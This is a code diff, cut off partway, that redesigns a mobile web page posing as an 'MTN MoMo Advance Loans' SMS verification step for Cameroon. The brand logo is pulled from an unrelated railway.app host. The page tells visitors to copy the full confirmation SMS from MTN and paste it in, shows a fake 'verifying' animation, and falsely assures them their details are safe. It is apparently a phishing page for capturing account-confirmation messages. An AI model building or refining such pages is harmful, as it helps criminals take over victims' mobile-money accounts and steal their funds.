@@ -1,23 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>MTN MoMo Loan - Verify SMS</title>
+    <meta name="theme-color" content="#000000">
+    <title>MTN MoMo Loan - Verify SMS | MoMo Advance Loans</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+        :root {
+            --black: #000000;
+            --mtn-dark: #003366;
+            --mtn-mid: #004080;
+            --mtn-gold: #FFCC00;
+            --mtn-gold-light: #FFD633;
+            --mtn-gold-dark: #E6B800;
+            --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
+            --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            --page-bg: #f9fafb;
+            --white: #FFFFFF;
+            --text-dark: #1C2340;
+            --text-mid: #4B5168;
+            --text-light: #8B90A3;
+            --border: #E4E7EF;
+            --error: #DC2626;
+            --success: #16A34A;
+            --header-h: 74px;
+            --footer-h: 68px;
+            --shadow-md: 0 6px 20px rgba(0, 25, 60, 0.08);
+            --shadow-lg: 0 20px 50px rgba(0, 25, 60, 0.12);
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         html, body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
+            background: var(--page-bg);
             overflow: hidden;
         }
 
@@ -25,69 +47,96 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 10px;
+            padding: var(--header-h) 0 var(--footer-h) 0;
             height: 100vh;
             height: 100dvh;
-            gap: 10px;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* ===== HEADER ===== */
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
+        /* ═══════════ HEADER — BLACK ═══════════ */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: var(--header-h);
+            background-color: var(--black);
+            color: var(--white);
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+        }
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 18px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            position: relative;
+            justify-content: space-between;
+        }
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: inherit;
+        }
+        .brand-logo-img {
+            height: 48px;
+            width: auto;
+            display: block;
+        }
+        .brand-divider {
+            width: 1px;
+            height: 26px;
+            background: rgba(255, 255, 255, 0.2);
+            margin: 0 4px;
             flex-shrink: 0;
         }
-
-        .back-btn {
-            font-size: 24px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
-            line-height: 1;
-            width: 24px;
-            text-align: left;
-            padding: 0;
-        }
-
-        .logo-container {
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .momo-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 700;
-            font-size: 16px;
-            padding: 7px 16px;
-            border-radius: 40px;
-            line-height: 1;
-            letter-spacing: -0.5px;
-            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        .brand-sub {
+            font-size: 12px;
+            color: #9ca3af;
+            font-weight: 500;
+            letter-spacing: 0.5px;
             white-space: nowrap;
         }
+        .header-back {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.82rem;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            padding: 8px 14px;
+            border-radius: 50px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+        .header-back:hover {
+            background: rgba(255, 255, 255, 0.18);
+            color: #fff;
+        }
 
-        /* ===== CARD ===== */
-        .card {
-            background: white;
-            border-radius: 24px;
-            padding: 24px 20px;
+        /* ═══════════ CARD ═══════════ */
+        .card-wrap {
             width: 100%;
             max-width: 480px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            margin: 14px 0;
+            padding: 0 14px;
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card {
+            background: white;
+            border-radius: 22px;
+            padding: 24px 20px;
+            width: 100%;
+            box-shadow: var(--shadow-lg);
+            border: 1px solid rgba(0, 51, 102, 0.05);
             flex: 1;
             min-height: 0;
             display: flex;
@@ -95,18 +144,19 @@
             overflow-y: auto;
         }
 
-        /* ===== ICON BADGE ===== */
+        /* ═══════════ ICON BADGE ═══════════ */
         .icon-badge {
-            width: 60px;
-            height: 60px;
+            width: 62px;
+            height: 62px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
+            background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 14px;
             font-size: 28px;
-            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
+            box-shadow: 0 6px 18px rgba(255, 204, 0, 0.25);
+            border: 1px solid #FFE999;
             flex-shrink: 0;
         }
 
@@ -114,58 +164,62 @@
             font-size: 20px;
             font-weight: 800;
             text-align: center;
-            color: #1a1a2e;
+            color: var(--text-dark);
             margin-bottom: 8px;
             line-height: 1.3;
+            letter-spacing: -0.02em;
         }
-
         .page-title .highlight {
-            color: #0047AB;
+            background: var(--grad-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 900;
         }
 
         .instruction {
             font-size: 13px;
-            color: #666;
+            color: var(--text-mid);
             text-align: center;
             line-height: 1.55;
             margin-bottom: 16px;
             padding: 0 4px;
+            font-weight: 500;
         }
-
         .instruction strong {
-            color: #1a1a2e;
-            font-weight: 700;
+            color: var(--text-dark);
+            font-weight: 800;
         }
 
-        /* ===== STEP HINT ===== */
+        /* ═══════════ STEP HINT ═══════════ */
         .step-hint {
-            background: #f8f9ff;
+            background: linear-gradient(135deg, #FFFBEB, #FFF8DC);
+            border: 1px solid #FFE999;
             border-radius: 12px;
-            padding: 11px 13px;
-            margin-bottom: 14px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
             display: flex;
             align-items: flex-start;
-            gap: 9px;
+            gap: 10px;
             flex-shrink: 0;
         }
-
         .step-hint .hint-icon {
             font-size: 16px;
             flex-shrink: 0;
             line-height: 1.4;
         }
-
         .step-hint p {
             font-size: 12px;
-            color: #555;
+            color: #7A5C00;
             line-height: 1.5;
+            font-weight: 600;
         }
-
         .step-hint p strong {
-            color: #0047AB;
+            color: #003366;
+            font-weight: 800;
         }
 
-        /* ===== SMS TEXTAREA ===== */
+        /* ═══════════ SMS TEXTAREA ═══════════ */
         .sms-wrapper {
             position: relative;
             margin-bottom: 6px;
@@ -175,34 +229,29 @@
             width: 100%;
             min-height: 130px;
             padding: 14px 14px 48px 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 14px 14px 14px 4px;
+            border: 1.5px solid var(--border);
+            border-radius: 14px 14px 14px 6px;
             font-size: 13px;
             font-family: 'Inter', sans-serif;
-            color: #1a1a2e;
+            color: var(--text-dark);
             line-height: 1.55;
             resize: vertical;
             outline: none;
-            background: #fafbff;
+            background: #FBFCFE;
             transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+            font-weight: 500;
         }
-
         .sms-textarea:focus {
-            border-color: #0047AB;
+            border-color: var(--mtn-gold);
             background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
         }
-
-        .sms-textarea::placeholder {
-            color: #b0b0b0;
-        }
-
+        .sms-textarea::placeholder { color: #A8AFC0; }
         .sms-textarea.invalid {
-            border-color: #e74c3c;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.12);
+            border-color: var(--error);
+            box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.12);
             animation: shake 0.4s ease;
         }
-
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-6px); }
@@ -216,42 +265,51 @@
             display: inline-flex;
             align-items: center;
             gap: 5px;
-            background: #0047AB;
-            color: white;
+            background: var(--grad-gold);
+            color: #1A1A2E;
             border: none;
             border-radius: 30px;
-            padding: 7px 12px;
+            padding: 7px 13px;
             font-size: 12px;
-            font-weight: 700;
+            font-weight: 800;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: background 0.2s, transform 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 71, 171, 0.25);
+            transition: transform 0.2s, box-shadow 0.2s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.4);
         }
-
-        .paste-btn:hover { background: #002D7A; }
+        .paste-btn:hover {
+            filter: brightness(0.96);
+            box-shadow: 0 6px 16px rgba(255, 204, 0, 0.5);
+        }
         .paste-btn:active { transform: scale(0.97); }
 
         .char-count {
             text-align: right;
             font-size: 11px;
-            color: #aaa;
+            color: var(--text-light);
             margin-bottom: 6px;
-            font-weight: 500;
+            font-weight: 600;
         }
-        .char-count.valid { color: #27ae60; }
+        .char-count.valid { color: var(--success); }
 
         .error-text {
-            color: #e74c3c;
+            color: var(--error);
             font-size: 12px;
             margin-top: 4px;
             display: none;
-            font-weight: 500;
+            font-weight: 700;
             line-height: 1.4;
         }
-        .error-text.show { display: block; }
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-4px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
 
-        /* ===== RESEND ROW ===== */
+        /* ═══════════ RESEND ROW ═══════════ */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -260,48 +318,63 @@
             padding: 0 2px;
             flex-shrink: 0;
         }
-
         .resend-row span {
             font-size: 12px;
-            color: #777;
+            color: var(--text-light);
+            font-weight: 600;
         }
-
         .resend-link {
             font-size: 12px;
-            font-weight: 700;
-            color: #0047AB;
+            font-weight: 800;
+            color: var(--mtn-dark);
             background: none;
             border: none;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
-            padding: 4px 8px;
+            padding: 5px 10px;
             border-radius: 8px;
             transition: background 0.2s;
         }
-
-        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:hover:not(:disabled) { background: #EEF3FF; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
-        /* ===== VERIFY BUTTON ===== */
+        /* ═══════════ VERIFY BUTTON ═══════════ */
         .verify-btn {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            color: white;
+            padding: 16px;
+            background: var(--grad-gold);
+            color: #1A1A2E;
             border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 700;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 900;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s, filter 0.2s;
             font-family: 'Inter', sans-serif;
             margin-top: 16px;
             flex-shrink: 0;
+            letter-spacing: 0.05em;
+            box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
         }
-
+        .verify-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+            transform: translateX(-100%);
+            transition: transform 0.7s;
+        }
+        .verify-btn:hover::after { transform: translateX(100%); }
         .verify-btn:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+            filter: brightness(0.98);
         }
         .verify-btn:active:not(:disabled) { transform: scale(0.98); }
         .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
@@ -310,8 +383,8 @@
             display: inline-block;
             width: 14px;
             height: 14px;
-            border: 2.5px solid rgba(255, 255, 255, 0.4);
-            border-top-color: #fff;
+            border: 2.5px solid rgba(0, 0, 0, 0.25);
+            border-top-color: #1A1A2E;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             vertical-align: -3px;
@@ -319,70 +392,105 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== SECURITY NOTICE ===== */
+        /* ═══════════ SECURITY NOTICE ═══════════ */
         .security-notice {
             display: flex;
             align-items: flex-start;
             justify-content: center;
-            gap: 5px;
+            gap: 6px;
             margin-top: 14px;
             font-size: 11px;
-            color: #999;
+            color: var(--text-light);
             line-height: 1.5;
             text-align: center;
             padding: 0 6px;
             flex-shrink: 0;
+            font-weight: 600;
         }
+        .security-notice .ico { color: var(--success); font-size: 13px; }
 
-        /* ===== FOOTER ===== */
-        footer {
-            padding: 6px;
-            color: #aaa;
+        /* ═══════════ FOOTER ═══════════ */
+        .footer {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: var(--footer-h);
+            background: var(--white);
+            border-top: 1px solid var(--border);
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.06);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .footer-text {
             font-size: 11px;
-            text-align: center;
-            width: 100%;
-            max-width: 480px;
-            flex-shrink: 0;
+            color: var(--text-light);
+            font-weight: 600;
+            letter-spacing: 0.05em;
         }
 
-        /* ===== SMALL PHONES ===== */
-        @media (max-height: 700px) {
-            .card { padding: 18px 16px; }
-            .icon-badge {
-                width: 52px;
-                height: 52px;
-                font-size: 24px;
-                margin-bottom: 10px;
-            }
-            .page-title { font-size: 18px; }
-            .instruction { font-size: 12px; margin-bottom: 12px; }
-            .sms-textarea { min-height: 100px; }
-            .verify-btn { margin-top: 12px; padding: 14px; }
-        }
-
-        @media (max-width: 380px) {
-            .sms-textarea {
-                font-size: 12px;
-                padding: 12px 12px 44px 12px;
-            }
-            .paste-btn { padding: 6px 10px; font-size: 11px; }
-        }
-
-        /* ============================================
-           VERIFYING OVERLAY
-           ============================================ */
+        /* ═══════════════════════════════════════════
+           SUPER VERIFY OVERLAY (matches login page)
+           ═══════════════════════════════════════════ */
         .verify-overlay {
             position: fixed;
             inset: 0;
-            background: #ffffff;
+            background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
             display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 32px 24px;
-            z-index: 2000;
+            z-index: 10000;
+            overflow: hidden;
         }
-        .verify-overlay.show { display: flex; }
+        .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .verify-overlay::before {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 700px; height: 700px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
+            animation: glowPulse 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes glowPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .verify-particles {
+            position: absolute;
+            inset: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        .verify-particle {
+            position: absolute;
+            width: 4px; height: 4px;
+            background: var(--mtn-gold);
+            border-radius: 50%;
+            opacity: 0;
+            box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
+            animation: particleFloat 8s infinite ease-in-out;
+        }
+        .verify-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
+        .verify-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
+        .verify-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
+        .verify-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
+        .verify-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
+        .verify-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
+        .verify-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
+        .verify-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
+        @keyframes particleFloat {
+            0% { opacity: 0; transform: translateY(0) scale(0.6); }
+            15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
+            80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
+            100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
+        }
 
         .verify-content {
             display: flex;
@@ -390,186 +498,338 @@
             align-items: center;
             max-width: 340px;
             text-align: center;
+            position: relative;
+            z-index: 2;
         }
 
-        .verify-momo-icon {
-            display: inline-flex;
+        .verify-orbit {
+            width: 140px;
+            height: 140px;
+            position: relative;
+            margin-bottom: 34px;
+        }
+        .verify-orbit-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(255, 204, 0, 0.35);
+            animation: rotateSlow 10s linear infinite;
+        }
+        .verify-orbit-ring.inner {
+            inset: 22px;
+            border: 1.5px dashed rgba(255, 204, 0, 0.55);
+            animation: rotateSlow 6s linear infinite reverse;
+        }
+        @keyframes rotateSlow { to { transform: rotate(360deg); } }
+
+        .verify-orbit-core {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 72px; height: 72px;
+            transform: translate(-50%, -50%);
+            border-radius: 18px;
+            background: var(--grad-gold);
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 800;
-            font-size: 20px;
-            padding: 11px 22px;
-            border-radius: 50px;
-            line-height: 1;
-            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
-            margin-bottom: 32px;
-            animation: overlayPulse 2s ease-in-out infinite;
+            box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+            animation: corePulse 2s ease-in-out infinite;
+            padding: 8px;
         }
-        @keyframes overlayPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        .verify-orbit-core img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        @keyframes corePulse {
+            0%, 100% {
+                box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5);
+                transform: translate(-50%, -50%) scale(1.06);
+            }
         }
 
-        .verify-spinner {
-            width: 52px;
-            height: 52px;
-            border: 5px solid #e0e8ff;
-            border-top-color: #0047AB;
-            border-radius: 50%;
-            animation: verifySpin 0.9s linear infinite;
-            margin-bottom: 26px;
+        .verify-dot-orbit {
+            position: absolute;
+            inset: 0;
+            animation: rotateSlow 3.5s linear infinite;
         }
-        @keyframes verifySpin { to { transform: rotate(360deg); } }
+        .verify-dot-orbit span {
+            position: absolute;
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--mtn-gold);
+            box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
+        }
+        .verify-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+        .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
+        .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
+        .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
         .verify-title {
-            font-size: 19px;
+            font-size: 20px;
             font-weight: 800;
-            color: #1a1a2e;
+            color: #fff;
             margin-bottom: 10px;
-            line-height: 1.3;
+            line-height: 1.35;
+            letter-spacing: -0.3px;
         }
-        .verify-title .highlight { color: #0047AB; }
+        .verify-title .highlight {
+            background: linear-gradient(90deg, #FFCC00, #FFD633);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
 
         .verify-subtitle {
-            font-size: 13px;
-            color: #888;
+            font-size: 13.5px;
+            color: rgba(255, 255, 255, 0.7);
             line-height: 1.6;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
+            font-weight: 500;
+            min-height: 1.4em;
+            transition: opacity 0.3s;
         }
 
-        .verify-dots span {
-            display: inline-block;
-            animation: dotBlink 1.4s infinite both;
-        }
+        .verify-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; }
         .verify-dots span:nth-child(1) { animation-delay: 0s; }
         .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
         .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
-
         @keyframes dotBlink {
             0%, 80%, 100% { opacity: 0.2; }
             40% { opacity: 1; }
         }
 
         .verify-bar {
-            width: 200px;
-            height: 5px;
-            background: #e8edf7;
+            width: 240px;
+            height: 6px;
+            background: rgba(255, 204, 0, 0.12);
             border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
+            position: relative;
         }
         .verify-bar-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #0047AB, #FFCC00);
+            background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+            background-size: 200% 100%;
             border-radius: 4px;
-            transition: width 0.3s ease;
+            transition: width 0.4s ease;
+            box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
+            animation: shimmer 2s linear infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
         }
 
-        .verify-security {
+        .verify-step {
+            position: relative;
+            height: 20px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .verify-step-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .verify-step-text {
+            height: 20px;
+            line-height: 20px;
+            font-size: 12px;
+            color: rgba(255, 204, 0, 0.9);
+            font-weight: 700;
+            letter-spacing: 0.03em;
+        }
+
+        .verify-status-row {
             display: flex;
             align-items: center;
-            gap: 5px;
-            font-size: 11px;
-            color: #aaa;
+            gap: 8px;
+            font-size: 11.5px;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+        .verify-status-dot {
+            width: 7px; height: 7px;
+            border-radius: 50%;
+            background: #22C55E;
+            box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
+            animation: statusPulse 1.6s ease-in-out infinite;
+        }
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.85); }
+        }
+
+        /* ═══════════ SMALL PHONES ═══════════ */
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .icon-badge { width: 52px; height: 52px; font-size: 24px; margin-bottom: 10px; }
+            .page-title { font-size: 18px; }
+            .instruction { font-size: 12px; margin-bottom: 12px; }
+            .sms-textarea { min-height: 100px; }
+            .verify-btn { margin-top: 12px; padding: 14px; }
+        }
+        @media (max-width: 480px) {
+            .brand-logo-img { height: 42px; }
+            .brand-sub { font-size: 11px; }
+            .verify-orbit { width: 120px; height: 120px; }
+            .verify-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
+            .verify-title { font-size: 18px; }
+        }
+        @media (max-width: 380px) {
+            .brand-sub { display: none; }
+            .brand-divider { display: none; }
+            .sms-textarea { font-size: 12px; padding: 12px 12px 44px 12px; }
+            .paste-btn { padding: 6px 10px; font-size: 11px; }
         }
     </style>
 </head>
 <body>
-    <header>
-        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go back">←</button>
-        <div class="logo-container">
-            <span class="momo-icon">MoMo</span>
+
+    <!-- ═══════════ HEADER ═══════════ -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="login.html" class="brand">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">MoMo Advance Loans</span>
+            </a>
+            <button class="header-back" onclick="window.location.href='login.html'">← Back</button>
         </div>
-        <div style="width:24px;"></div>
     </header>
 
-    <main class="card">
-        <div class="icon-badge">📩</div>
+    <!-- ═══════════ CARD ═══════════ -->
+    <div class="card-wrap">
+        <main class="card">
+            <div class="icon-badge">📩</div>
 
-        <h1 class="page-title">
-            Paste the <span class="highlight">SMS</span> from MTN
-        </h1>
+            <h1 class="page-title">
+                Paste the <span class="highlight">SMS</span> from MTN
+            </h1>
 
-        <p class="instruction">
-            We sent a confirmation message to your MoMo number.
-            <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
-        </p>
+            <p class="instruction">
+                We sent a confirmation message to your MoMo number.
+                <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
+            </p>
 
-        <div class="step-hint">
-            <span class="hint-icon">💡</span>
-            <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN MoMo</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
-        </div>
+            <div class="step-hint">
+                <span class="hint-icon">💡</span>
+                <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN MoMo</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
+            </div>
 
-        <div class="sms-wrapper">
-            <textarea
-                class="sms-textarea"
-                id="smsInput"
-                placeholder="Paste the SMS you received from MTN here…"
-                spellcheck="false"
-                autocomplete="off"></textarea>
-            <button class="paste-btn" id="pasteBtn" type="button">
-                <span>📋</span>
-                <span>Paste</span>
+            <div class="sms-wrapper">
+                <textarea
+                    class="sms-textarea"
+                    id="smsInput"
+                    placeholder="Paste the SMS you received from MTN here…"
+                    spellcheck="false"
+                    autocomplete="off"></textarea>
+                <button class="paste-btn" id="pasteBtn" type="button">
+                    <span>📋</span>
+                    <span>Paste</span>
+                </button>
+            </div>
+
+            <div class="char-count" id="charCount">0 characters</div>
+
+            <div class="error-text" id="smsError">
+                The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.
+            </div>
+
+            <div class="resend-row">
+                <span>Didn't receive the SMS?</span>
+                <button class="resend-link" id="resendBtn" type="button" disabled>
+                    Resend (<span id="countdown">60</span>s)
+                </button>
+            </div>
+
+            <button class="verify-btn" id="verifyBtn" disabled>
+                VERIFY &amp; CONTINUE →
             </button>
-        </div>
 
-        <div class="char-count" id="charCount">0 characters</div>
+            <div class="security-notice">
+                <span class="ico">🔒</span>
+                <span>We never ask for your PIN, password, or bank details. Only paste the SMS you received from MTN.</span>
+            </div>
+        </main>
+    </div>
 
-        <div class="error-text" id="smsError">
-            The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.
-        </div>
+    <!-- ═══════════ FOOTER ═══════════ -->
+    <footer class="footer">
+        <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
+    </footer>
 
-        <div class="resend-row">
-            <span>Didn't receive the SMS?</span>
-            <button class="resend-link" id="resendBtn" type="button" disabled>
-                Resend (<span id="countdown">60</span>s)
-            </button>
-        </div>
-
-        <button class="verify-btn" id="verifyBtn" disabled>
-            VERIFY &amp; CONTINUE →
-        </button>
-
-        <div class="security-notice">
-            <span>🔒</span>
-            <span>We never ask for your PIN, password, or bank details. Only paste the SMS you received from MTN.</span>
-        </div>
-    </main>
-
-    <footer>© 2026 MTN MoMo Cameroon</footer>
-
-    <!-- ===== VERIFYING OVERLAY ===== -->
+    <!-- ═══════════ SUPER VERIFY OVERLAY ═══════════ -->
     <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-particles">
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+        </div>
+
         <div class="verify-content">
-            <div class="verify-momo-icon">MoMo</div>
-            <div class="verify-spinner"></div>
+            <div class="verify-orbit">
+                <div class="verify-orbit-ring"></div>
+                <div class="verify-orbit-ring inner"></div>
+                <div class="verify-dot-orbit">
+                    <span></span><span></span><span></span><span></span>
+                </div>
+                <div class="verify-orbit-core">
+                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+                </div>
+            </div>
+
             <h2 class="verify-title" id="verifyTitle">
-                Verifying your <span class="highlight">SMS</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+                Verifying your <span class="highlight">SMS</span>
             </h2>
             <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
+
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
-            <div class="verify-security">
-                <span>🔒</span>
-                <span>Secure connection to MTN MoMo</span>
+
+            <div class="verify-step">
+                <div class="verify-step-inner" id="verifyStepInner">
